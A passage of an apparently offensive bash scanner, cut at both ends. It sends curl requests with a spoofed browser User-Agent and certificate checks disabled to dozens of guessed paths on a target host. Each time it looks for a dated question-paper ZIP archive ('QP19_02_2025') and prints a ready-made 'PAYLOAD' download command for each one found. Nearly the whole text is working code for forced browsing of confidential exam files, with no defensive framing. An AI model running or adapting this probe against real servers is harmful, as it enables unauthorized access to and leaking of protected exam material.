${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerMassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
